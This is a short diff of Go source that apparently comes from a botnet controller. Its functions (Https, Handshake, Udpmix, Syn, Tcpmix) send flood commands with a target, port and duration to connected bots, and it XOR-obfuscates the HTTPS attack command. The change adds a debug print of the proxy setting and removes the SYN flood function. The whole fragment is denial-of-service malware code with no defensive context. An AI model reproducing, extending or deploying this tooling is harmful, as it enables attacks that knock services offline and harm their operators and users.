@@ -49,6 +49,7 @@ func Https(target string, duration string, port string) {
 	for _, conn := range Conns {
 		var command string
 
+		fmt.Println(strconv.FormatBool(config.GetConfig().Proxy.Useproxy))
 		for _, i := range "https" + " " + target + " " + port + " " + duration + " " + strconv.FormatBool(config.GetConfig().Proxy.Useproxy) {
 			command += string(i ^ 29>>3)
 		}
@@ -73,10 +74,6 @@ func Handshake(target string, duration string, port string) {
 
 func Udpmix(target string, duration string, port string) {
 	sendCmd("udpmix", target, port, duration)
-}
-
-func Syn(target string, duration string, port string) {
-	sendCmd("syn", target, port, duration)
 }
 
 func Tcpmix(target string, duration string, port string) {
